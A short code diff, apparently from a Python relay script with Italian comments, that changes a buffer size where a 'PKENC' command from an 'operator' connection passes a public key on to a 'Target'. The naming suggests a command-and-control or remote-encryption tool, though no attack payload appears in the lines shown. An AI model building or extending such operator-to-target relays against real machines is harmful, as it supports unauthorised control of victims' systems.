@@ -41,7 +41,7 @@ while True:
         
     # Riceve la chiave pubblica asimmetrica e la inoltra al Target
     if command.decode().strip().upper().startswith("PKENC"):
-        public_key = conn_operator.recv(4096)
+        public_key = conn_operator.recv(1024)
         if public_key is not None:
             print("Key received.")
         s2.send(public_key)    
